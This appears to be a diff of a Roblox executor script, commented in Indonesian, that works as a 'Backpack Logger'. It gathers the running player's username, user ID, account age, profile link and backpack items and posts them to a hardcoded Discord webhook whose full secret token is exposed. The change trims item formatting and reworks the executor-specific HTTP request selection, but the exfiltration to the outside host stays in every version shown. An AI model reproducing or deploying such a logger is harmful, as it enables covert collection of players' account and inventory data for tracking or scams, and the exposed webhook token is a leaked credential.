@@ -1,107 +1,102 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
--- Improved number formatting with commas
-local function formatNumberWithCommas(n)
-    local num = tostring(math.floor(tonumber(n) or 0))
-    local formatted = num:reverse():gsub("(%d%d%d)", "%1,"):reverse()
-    return formatted:gsub("^,", "")
-end
-
 local player = Players.LocalPlayer
 local userId = player.UserId
 local playerName = player.Name
-local accountAge = player.AccountAge
+local accountAge = player.AccountAge -- umur akun dalam hari
 local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
 
--- Backpack collection with error handling
+-- Kumpulkan isi backpack (nama tool)
 local backpack = player:WaitForChild("Backpack")
 local backpackItems = {}
 for _, item in ipairs(backpack:GetChildren()) do
-    -- Safely get attributes with defaults
-    local weight = math.floor((tonumber(item:GetAttribute("Weight")) or 0 * 100) / 100
-    local age = tonumber(item:GetAttribute("Age")) or 1
-    local value = tonumber(item:GetAttribute("Value")) or 0
-    
-    -- Format the display string
-    local itemName = item.Name
-    if item:GetAttribute("IsCelestial") then
-        itemName = "[Celestial] " .. itemName
-    end
-    
-    table.insert(backpackItems, {
-        text = string.format("%s [%.2f KG] [Age %d] → %s#", 
-            itemName, weight, age, formatNumberWithCommas(value)),
-        value = value
-    })
+    table.insert(backpackItems, item.Name)
 end
+local backpackStr = #backpackItems > 0 and table.concat(backpackItems, ", ") or "Kosong"
 
--- Safe sorting function
-table.sort(backpackItems, function(a, b)
-    return a.value > b.value
-end)
-
--- Extract just the text for display
-local backpackDisplay = {}
-for _, item in ipairs(backpackItems) do
-    table.insert(backpackDisplay, item.text)
-end
-
-local backpackStr = #backpackDisplay > 0 and table.concat(backpackDisplay, "\n") or "Kosong"
-
--- Limit length for Discord
-local maxLength = 3000
-if #backpackStr > maxLength then
-    backpackStr = backpackStr:sub(1, maxLength - 3) .. "..."
-end
-
--- Webhook setup
 local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 
--- Select request function based on executor
-local requestFunction = (syn and syn.request) or (fluxus and fluxus.request) or 
-                       (krnl and krnl.request) or (http_request or request)
+-- Pilih fungsi request sesuai executor
+local requestFunction = nil
 
-if not requestFunction then
+if type(http_request) == "function" then
+    requestFunction = http_request
+elseif type(request) == "function" then
+    requestFunction = request
+elseif syn and type(syn.request) == "function" then
+    requestFunction = syn.request
+elseif fluxus and type(fluxus.request) == "function" then
+    requestFunction = fluxus.request
+elseif krnl and type(krnl.request) == "function" then
+    requestFunction = krnl.request
+end
+
+if typeof(requestFunction) ~= "function" then
     warn("❌ Executor tidak mendukung HTTP request.")
     return
 end
 
 local function safeRequest(options)
-    local success, result = pcall(requestFunction, options)
-    return success and result or nil
+    local success, result = pcall(function()
+        return requestFunction(options)
+    end)
+    if success then
+        return result
+    else
+        warn("❌ Request error:", result)
+        return nil
+    end
 end
 
--- Create Discord embed
-local embed = {
-    title = "📦 Informasi Backpack dan Akun",
-    color = 0x3498db,
-    fields = {
-        {name = "👤 Player", value = string.format("`%s` (ID: `%d`)", playerName, userId), inline = true},
-        {name = "⏳ Umur Akun", value = string.format("%d hari", accountAge), inline = true},
-        {name = "🔗 Profile Roblox", value = string.format("[Klik Disini](%s)", profileUrl), inline = false},
-        {name = "🎒 Isi Backpack", value = "```\n" .. backpackStr .. "\n```", inline = false}
-    },
-    footer = {
-        text = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
-        icon_url = "https://i.imgur.com/Z4VbQXz.png"
-    },
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+-- Buat payload embed webhook Discord
+local webhookPayload = {
+    ["username"] = "🎒 Backpack Logger",
+    ["avatar_url"] = "https://i.imgur.com/0y0F0Gj.png", -- Icon tas, bisa ganti
+    ["embeds"] = {{
+        ["title"] = "📦 Informasi Backpack dan Akun",
+        ["color"] = 0x3498db, -- biru
+        ["fields"] = {
+            {
+                ["name"] = "👤 Player",
+                ["value"] = string.format("`%s` (ID: `%d`)", playerName, userId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "⏳ Umur Akun",
+                ["value"] = string.format("%d hari", accountAge),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🔗 Profile Roblox",
+                ["value"] = string.format("[Klik Disini](%s)", profileUrl),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🎒 Isi Backpack",
+                ["value"] = backpackStr,
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
+            ["icon_url"] = "https://i.imgur.com/Z4VbQXz.png"
+        },
+        ["timestamp"] = DateTime.now():ToIsoDate()
+    }}
 }
 
--- Send to Discord
+-- Kirim webhook ke Discord
 local response = safeRequest({
     Url = webhookUrl,
     Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode({
-        username = "🎒 Backpack Logger",
-        avatar_url = "https://i.imgur.com/0y0F0Gj.png",
-        embeds = {embed}
-    })
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(webhookPayload)
 })
 
-if response and (response.StatusCode == 204 or response.StatusCode == 200) then
+if response and response.StatusCode == 204 then -- Discord webhook sukses kirim status 204 No Content
     print("✅ Webhook Discord berhasil dikirim!")
 else
     warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "No response")
